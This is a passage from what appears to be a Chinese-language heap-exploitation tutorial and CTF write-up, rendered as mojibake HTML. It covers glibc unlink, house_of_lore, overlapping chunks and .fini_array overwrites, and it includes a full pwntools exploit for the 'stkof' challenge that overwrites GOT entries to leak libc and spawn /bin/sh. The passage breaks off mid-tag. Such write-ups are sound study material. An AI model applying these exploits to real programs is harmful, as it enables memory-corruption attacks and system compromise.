†æº¢å‡ºå¸ƒç½®å¥½äº† chunk3 ï¼Œå› æ­¤ç³»ç»Ÿè®¤ä¸ºå‰ä¸€ä¸ª chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œå¹¶é€šè¿‡ chunk3 çš„ä½ç½®å’Œ prev_size å®šä½åˆ°å‰ä¸€ä¸ª chunk ï¼Œå³ä¼ªé€ çš„ fake chunkã€‚éšååˆå¹¶è¿™ä¸¤ä¸ª chunkï¼Œè¿™æ—¶å€™è¦å†è¿›è¡Œåˆ¤æ–­ï¼Œåˆ¤æ–­çš„æ¡ä»¶å°±æ˜¯ï¼š</p><p><code>FD-&gt;bk=fake chunk &amp;&amp; BK-&gt;fd=fake chunk</code></p><p>åœ¨æœ¬é¢˜æƒ…å†µä¸­ï¼ŒFD&#x3D;fake chunk-&gt;fdã€BK&#x3D;fake chunk-&gt;bkï¼Œå³ <strong>FD&#x3D;0x602138ã€BK&#x3D;0x602140</strong>ï¼Œæ‰€ä»¥å°±æ»¡è¶³äº†<strong>FD-&gt;bk&#x3D;FD+0x18ã€BK-&gt;fd&#x3D;BK+0x10</strong> è€Œè¿™ä¸¤ä¸ªç»“æœéƒ½æŒ‡å‘ fake chunk çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿ç»•è¿‡äº†æ£€æµ‹ã€‚</p><p>è€Œåä¼šæ‰§è¡Œ <code>FD-&gt;bk=BK</code>ã€<code>BK-&gt;fd=FD</code>ï¼Œå³å…ˆæŠŠ 0x602150 å¤„å­˜å‚¨çš„æ•°æ®ä¿®æ”¹ä¸º 0x602140 ï¼Œç„¶åå†æ”¹ä¸º0x602138 ä¹Ÿå°±æ˜¯ <code>ptr-0x18</code> ã€‚</p><p>0x602150 å¤„æœ¬åº”è¯¥å­˜å‚¨ç€ chunk2 çš„åœ°å€ï¼Œä½†ç°åœ¨å·²ç»è¢«æˆ‘ä»¬æ”¹æ‰äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå‘ .bss æ®µå†™å…¥æ•°æ®ï¼Œç»§ç»­è¿›è¡Œæ”¹å†™ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å°†æŒ‡é’ˆæ”¹å†™ä¸ºå¯¹åº”å‡½æ•°çš„ got è¡¨åœ°å€è¿›è¡Œæ³„éœ²å’Œæ”¹å†™ï¼Œä»è€Œ getshellã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh=process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./stkof&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>ptr=<span class="hljs-number">0x602150</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, size, content</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><br>malloc(<span class="hljs-number">0x100</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br><br>free(<span class="hljs-number">3</span>)<br>sh.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(puts_got)<br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>write(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(puts_plt))<br>free(<span class="hljs-number">3</span>)<span class="hljs-comment">#è¿™ä¸ªæ—¶å€™ free(3) å®é™…ä¸Šå°±æ˜¯ put(puts_plt)</span><br><br>base = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sh.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>system_addr=base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free_got)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">&quot;/bin/sh&quot;</span><br>write(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>write(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(system_addr))<br>free(<span class="hljs-number">3</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h1><p><strong>åŸç†ï¼š</strong>è¿™ä¸ªæ”»å‡»é’ˆå¯¹çš„æ˜¯ smallbin ï¼Œé€šè¿‡ä¿®æ”¹ smallbin ä¸­çš„ bk æŒ‡é’ˆï¼Œæ¥ç”³è¯·ä»»æ„åœ°å€ã€‚</p><p><strong>çŸ¥è¯†ç‚¹âœ¨ï¼š</strong> </p><ul><li>åœ¨åˆ†é… smallbin å¤§å°çš„å †å—æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥é“¾è¡¨å€’æ•°ç¬¬äºŒä¸ªå †å—çš„ bk æŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç¬¬ä¸€å—ã€‚</li></ul><p><strong>GDB è°ƒè¯•</strong></p><p>æˆ‘ä»¬ä¸»è¦çš„ç›®çš„æ˜¯ä¼ªé€ ä¸€æ¡ small bins é“¾ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆç”³è¯·ä¸¤ä¸ª chunkï¼Œä¸€ä¸ªchunk æ˜¯æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„å †å—ï¼Œæˆ‘ä»¬ç§°å…¶ä¸º victim chunkï¼Œç¬¬äºŒä¸ªç”¨äºé˜²æ­¢ä¸top chunk åˆå¹¶ã€‚</p><p>ç„¶åï¼Œåœ¨æ ˆä¸Šä¼ªé€ ä¸¤ä¸ª fake chunk ï¼Œè®© fake chunk 1 çš„ fd æŒ‡å‘ victim chunk ï¼Œbk æŒ‡å‘ fake chunk 2 ï¼Œfake chunk 2 çš„ fd æŒ‡å‘ fake chunk 1ï¼Œè¿™æ ·ä¸€ä¸ª small bin é“¾å°±å·®ä¸å¤šäº†ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_lore_victim.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ free victimï¼Œå®ƒä¼šè¿›å…¥ fastbin ã€‚è¿™æ—¶å€™æˆ‘ä»¬å†å» malloc ä¸€ä¸ªå¤§çš„ chunk ï¼Œå°±ä¼šè§¦å‘ fast bin çš„åˆå¹¶ï¼Œvictim ä¼šæ”¾åˆ° unsorted bin ä¸­ï¼Œæœ€ç»ˆè¢«æ•´ç†å›åˆ° small binã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_lore_free.png"></p><p>ç°åœ¨æˆ‘ä»¬å‡è®¾å­˜åœ¨ä¸€ä¸ªå¯ä»¥è¦†ç›– victim çš„ bk æŒ‡é’ˆçš„æ¼æ´ï¼Œè®©å®ƒçš„ bk æŒ‡é’ˆæŒ‡å‘æ ˆä¸Šã€‚</p><p>è¿™æ ·ï¼Œæˆ‘ä»¬ç”³è¯·ä¸€ä¸ªå’Œ victim åŒæ ·å¤§å°çš„ chunkï¼Œä¼šæŠŠç©ºé—²çš„ victim åˆ†é…å‡ºå»ã€‚è€Œåå†ç”³è¯·å †å—ï¼Œå°±ä¼šåˆ° victim-&gt;bk å¤„ï¼Œå³æ ˆä¸Šå»å¯»æ‰¾å †å—ã€‚</p><p>è¿™æ ·æˆ‘ä»¬å°±æˆåŠŸåœ°éª—è¿‡äº† malloc åœ¨æ ˆä¸Šåˆ†é…äº†ä¸€ä¸ª chunkã€‚</p><h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†åœ¨ how2heap é‡Œæ˜¯åˆ† 1 å’Œ 2 çš„ï¼Œ1 çš„åŸç†æ˜¯ï¼šé€šè¿‡æº¢å‡ºæ¼æ´ä¿®æ”¹ç©ºé—²å †å—çš„ size ï¼Œå°†åœ°å€ç›¸é‚»çš„ä¸¤ä¸ª chunk â€œåˆå¹¶â€ã€‚ å¦‚æœ free åå†æ¬¡ç”³è¯·ä¸€ä¸ªå¤§å°åŒ¹é…çš„å †å—ï¼Œå°±ä¼šå †å—çš„é‡å ã€‚</p><p>æ¯”è¾ƒç®€å•ä¸€çœ‹å°±æ‡‚ï¼Œå°±ç•¥è¿‡ç›´æ¥å¼€å§‹ 2 äº†</p></blockquote><p><strong>åŸç†ï¼š</strong>åœ¨é‡Šæ”¾å †å—ä¹‹å‰ä¿®æ”¹å®ƒçš„ size å¤§å°ï¼Œç­‰å®ƒè¢«é‡Šæ”¾åï¼Œé”™è¯¯åœ°ä¿®æ”¹ä¸‹ä¸€ä¸ª chunk çš„ prev_sizeï¼Œå¯¼è‡´ä¸­é—´çš„chunk å¼ºè¡Œåˆå¹¶ã€‚</p><p><strong>GDB è°ƒè¯•</strong></p><p>æˆ‘ä»¬åœ¨æœ¬æ¬¡å®éªŒä¸­å…±åˆ†é…äº”ä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å—ç”¨äºæ¨¡æ‹Ÿæº¢å‡ºæ¼æ´æ¥æ”¹å†™ç¬¬äºŒä¸ªå †å—çš„æ•°æ®ï¼Œæˆ‘ä»¬ç›®æ ‡é‡å çš„éƒ¨åˆ†æ˜¯ç¬¬äºŒè‡³ç¬¬å››ä¸ªå †å—ï¼Œç¬¬äº”ä¸ªå †å—ç”¨äºé˜²æ­¢ä¸ top chunk åˆå¹¶ã€‚</p><p>æˆ‘ä»¬å…ˆ free chunk 4 </p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free4.png"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨ chunk1 çš„æº¢å‡ºæ¼æ´æ¥æ”¹å†™ chunk2 çš„ size å€¼ã€‚å°† size æ”¹ä¸º chunk2 å’Œ chunk3 çš„å¤§å°ä¹‹å’Œï¼Œåœ¨æœ¬æ¬¡å®ä¾‹ä¸­å°±æ˜¯ <code>0x3f0+0x3f0+0x1=0x7e1</code></p><p>è¿™æ—¶æˆ‘ä»¬å† free 2ï¼Œæ ¹æ®è¿™ä¸ªè¢«ä¿®æ”¹çš„ size å€¼ï¼Œç¨‹åºä¼šä»¥ä¸º chunk 2 åŠ ä¸Š chunk 3 çš„åŒºåŸŸéƒ½æ˜¯è¦é‡Šæ”¾çš„ï¼Œå°±ä¼šé”™è¯¯åœ°ä¿®æ”¹äº†chunk 5çš„ prev_size ã€‚</p><p>æ¥ç€ï¼Œå®ƒå‘ç°ç´§é‚»çš„ä¸€å—chunk 4ä¹Ÿæ˜¯ free çŠ¶æ€ï¼Œå°±æŠŠå®ƒä¿©åˆå¹¶åœ¨äº†ä¸€èµ·ï¼Œç»„æˆä¸€ä¸ªå¤§free chunkï¼Œæ”¾è¿›unsorted binä¸­ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/overlap_free2.png"></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯¹ chunk3 é€ æˆäº†é‡å ï¼Œå¯ä»¥æ”¹å†™å…¶ä¸­çš„å†…å®¹äº†ã€‚</p><h3 id="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-Hack-lu-CTF-2015-Bookstore"><a href="#ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-Hack-lu-CTF-2015-Bookstore" class="headerlink" title="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ Hack.lu CTF 2015 Bookstore"></a>ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ Hack.lu CTF 2015 Bookstore</h3><p>é¢˜ç›®æ˜¯ä¸€ä¸ªè®¢ä¹¦ç³»ç»Ÿï¼Œé€‰é¡¹1-5 å¯¹åº” 1ã€2 ç¼–è¾‘è®¢å•ä¿¡æ¯ï¼Œ3ã€4åˆ é™¤è®¢å•ä¿¡æ¯ï¼Œ5 æäº¤è®¢å•ä¿¡æ¯ã€‚</p><p>å…¶ä¸­1ã€2 çš„ç¼–è¾‘åŠŸèƒ½ç”¨åŒä¸€ä¸ªå‡½æ•°å®ç°ï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/bookstore_edit.png"></p><p>åˆ é™¤è®¢è´­å•æ˜¯ free æ‰äº†å¯¹åº”çš„æŒ‡é’ˆï¼Œæ²¡æœ‰æŠŠæŒ‡é’ˆæŒ‡é’ˆç½®ä¸º NULLï¼Œå­˜åœ¨ UAF æ¼æ´ã€‚</p><p>æœ€åæäº¤åŠŸèƒ½ä¸­æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯è¿™ä¸ªæ¼æ´åœ¨ submit åŠŸèƒ½ä¸­ï¼Œåªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</p><ul><li>é¦–å…ˆè€ƒè™‘å¦‚ä½•åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼š</li></ul><p>æˆ‘ä»¬å¿…é¡»å¾—è¦æ§åˆ¶ dest çš„å†…å®¹æ‰èƒ½è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•æ§åˆ¶å‘¢ï¼Ÿç¨‹åºæœ€å¼€å§‹çš„æ—¶å€™åˆ†é…äº†ä¸‰ä¸ªè¿ç»­çš„å †å— <em>v6</em>ã€<em>v7</em> å’Œ <em>dest</em>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æº¢å‡º <em>v7</em> æ¥ä¿®æ”¹ <em>dest</em> çš„å†…å®¹ã€‚ä½†æ˜¯æœ€åä¼šè¢«æ”¹å†™ä¸ºå›ºå®šçš„å†…å®¹ â€œYour order is submittedâ€ã€‚</p><blockquote><p>çœŸå¥‡æ€ªæˆ‘çœ‹èŠ±çœ¼ä¹Ÿæ²¡çœ‹å‡ºæ¥å“ªé‡Œç»™å®ƒèµ‹å€¼äº†</p></blockquote><p>åœ¨æœ€åæ‰§è¡Œ submitted çš„æ—¶å€™ä¼šç”³è¯·ä¸€ä¸ª <em>v5</em> ï¼Œè¿™ä¸ªå †å—çš„æŒ‡é’ˆæ˜¯ä¸ç¡®å®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥ä» top chunk é‡Œé‡æ–°åˆ†é…ï¼Œä¹Ÿå¯ä»¥ free æ‰ <em>v6</em> ã€<em>v7</em>ï¼Œä»ä»–ä»¬å½“ä¸­åˆ†é…ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ overlapping ï¼Œåˆ©ç”¨ <em>v7</em> å®ç° dest éƒ¨åˆ†çš„å †é‡å ï¼Œä»è€Œåœ¨ submitted æ—¶æ”¹å†™ <em>dest</em> ã€‚</p><ul><li>å› ä¸ºæˆ‘ä»¬é¦–å…ˆéœ€è¦åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åŸºå€ï¼Œç„¶åéœ€è¦å†åˆ©ç”¨ä¸€æ¬¡å»æ”¹å†™åœ°å€ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•å¤šæ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼š</li></ul><p>åœ¨æ¥æ”¶ç”¨æˆ·é€‰æ‹©è¾“å…¥æ—¶ï¼Œå…è®¸ç”¨æˆ·è¾“å…¥ 128 é•¿åº¦çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯é•¿åº¦ä¸å¤Ÿå»åˆ©ç”¨æ ˆæº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨å…¶ä»–çš„æ–¹æ³•ã€‚</p><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°å¦å¤–ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<strong>ç¨‹åºé€€å‡ºåä¼šæ‰§è¡Œ <code>.fini_array</code> åœ°å€å¤„çš„å‡½æ•°ï¼Œä¸è¿‡åªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</strong></p><h4 id="ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹-init-array-å’Œ-fini-array-èŠ‚ï¼"><a href="#ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹-init-array-å’Œ-fini-array-èŠ‚ï¼" class="headerlink" title="ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹ .init_array å’Œ  .fini_array èŠ‚ï¼"></a>ä¸­æ’çŸ¥è¯†ç‚¹ä¹‹ .init_array å’Œ  .fini_array èŠ‚ï¼</h4><blockquote><p>å¤§å¤šæ•°å¯æ‰§è¡Œæ–‡ä»¶æ˜¯é€šè¿‡é“¾æ¥ libc æ¥è¿›è¡Œç¼–è¯‘çš„ï¼Œå› æ­¤ gcc ä¼šå°† glibc åˆå§‹åŒ–ä»£ç æ”¾å…¥ç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«åº“ä¸­ã€‚ .init_arrayå’Œ .fini_array èŠ‚ï¼ˆæ—©æœŸç‰ˆæœ¬è¢«ç§°ä¸º .ctorså’Œ .dtors ï¼‰ä¸­å­˜æ”¾äº†æŒ‡å‘åˆå§‹åŒ–ä»£ç å’Œç»ˆæ­¢ä»£ç çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>.init_array å‡½æ•°æŒ‡é’ˆä¼šåœ¨ main() å‡½æ•°è°ƒç”¨ä¹‹å‰è§¦å‘ã€‚è¿™å°±æ„å‘³ç€ï¼Œå¯ä»¥é€šè¿‡é‡å†™æŸä¸ªæŒ‡å‘æ­£ç¡®åœ°å€çš„æŒ‡é’ˆæ¥å°†æ§åˆ¶æµæŒ‡å‘ç—…æ¯’æˆ–è€…å¯„ç”Ÿä»£ç ã€‚ .fini_array å‡½æ•°æŒ‡é’ˆåœ¨ main() å‡½æ•°æ‰§è¡Œå®Œä¹‹åæ‰è¢«è§¦å‘ï¼Œåœ¨æŸäº›åœºæ™¯ä¸‹è¿™ä¸€ç‚¹ä¼šéå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œç‰¹å®šçš„å †æº¢å‡ºæ¼æ´ï¼ˆå¦‚æ›¾ç»çš„ Once upon a free()ï¼‰ä¼šå…è®¸æ”»å‡»è€…åœ¨ä»»æ„ä½ç½®å†™4ä¸ªå­—èŠ‚ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä½¿ç”¨ä¸€ä¸ªæŒ‡å‘ shellcode åœ°å€çš„å‡½æ•°æŒ‡é’ˆæ¥é‡å†™ .fini_array å‡½æ•°æŒ‡é’ˆã€‚</p><p>å¯¹äºå¤§å¤šæ•°ç—…æ¯’æˆ–è€…æ¶æ„è½¯ä»¶ä½œè€…æ¥è¯´ï¼Œ .init_array å‡½æ•°æŒ‡é’ˆæ˜¯æœ€å¸¸è¢«æ”»å‡»çš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒé€šå¸¸å¯ä»¥ä½¿å¾—å¯„ç”Ÿä»£ç åœ¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†æ‰§è¡Œä¹‹å‰å°±èƒ½å¤Ÿå…ˆè¿è¡Œã€‚</p></blockquote><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç è‡ªå·±å®éªŒä¸€ä¸‹ .ini_array å’Œ .fini_array çš„æŒ‡é’ˆå±æ€§ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((constructor))</span>;<br><span class="hljs-comment">//constructoræ„ä¸ºæ„é€ å‡½æ•°å£°æ˜ï¼Œæ‰€æœ‰æ„é€ å‡½æ•°éƒ½ä¼šåœ¨mainå‡½æ•°ä¹‹å‰æ‰§è¡Œ</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((destructor))</span>;<br><span class="hljs-comment">//destructoræ„ä¸ºææ„å‡½æ•°ï¼Œæ‰€æœ‰ææ„å‡½æ•°éƒ½ä¼šåœ¨mainå‡½æ•°ä¹‹åè¿è¡Œ</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start == %p\n&quot;</span>, start);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stop == %p\n&quot;</span>, stop);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye world!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ‰§è¡Œè¿™ä¸ªç¨‹åºï¼Œå¹¶æŸ¥çœ‹å…¶ .init_array å’Œ .fini_array çš„åœ°å€</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_1.png"></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_3.png"></p><p>æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ .init_array å’Œ .fini_array åœ°å€å¤„å­˜å‚¨çš„æŒ‡é’ˆï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_2.png"></p><p>.init_array å­˜çš„ <code>0x400540</code> æ˜¯ frame_dummy å‡½æ•°åœ°å€ï¼ˆå¯ä»¥åœ¨ ida é‡Œé¢æŸ¥çœ‹ï¼‰ï¼Œ<code>0x4005a4</code> æ˜¯æˆ‘è‡ªå·±å®šä¹‰çš„ start å‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ main å‡½æ•°å¼€å§‹ä¹‹å‰ä¼šå…ˆæ‰§è¡Œ frame_dummy å‡½æ•°å’Œ start å‡½æ•°ã€‚</p><p>.fini_array å­˜çš„ <code>0x400520</code> æ˜¯ do_global_dtors_aux å‡½æ•°åœ°å€ï¼Œ<code>0x4005b5</code> æ˜¯è‡ªå·±å®šä¹‰çš„ stop å‡½æ•°çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¯´ main å‡½æ•°ç»“æŸä¹‹åä¼šæ‰§è¡Œ do_global_dtors_aux å‡½æ•°å’Œ stop å‡½æ•°ã€‚</p><p>å»é™¤æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„å±æ€§ï¼Œæ­¤æ—¶ .ini_array å’Œ .fini_array éƒ½åªæœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¯¹åº”çš„ .ini_array æ˜¯ frame_dummy å‡½æ•°åœ°å€ï¼Œfini_arrayæ˜¯ __do_global_dtors_aux å‡½æ•°åœ°å€ã€‚</p><blockquote><p>çŸ¥è¯†ç‚¹ç»“æŸï¼</p></blockquote><hr><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°† <code>.fini_array</code> åœ°å€å¤„çš„å‡½æ•°ä¿®æ”¹æˆ main å‡½æ•°çš„åœ°å€ï¼Œä½¿ç¨‹åºé‡æ–°å›åˆ° main å‡½æ•°ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„æ¼ libc åœ°å€ï¼Œå†è¿›è¡Œ shellcode çš„æ„é€ è¿™æ ·å°±æ˜¯æ€»å…±åˆ©ç”¨ä¸‰æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ ida é‡Œé¢çœ‹åˆ° <code>.fini_array</code>  çš„åœ°å€æ˜¯ 0x6011B8ï¼š</p><p><img 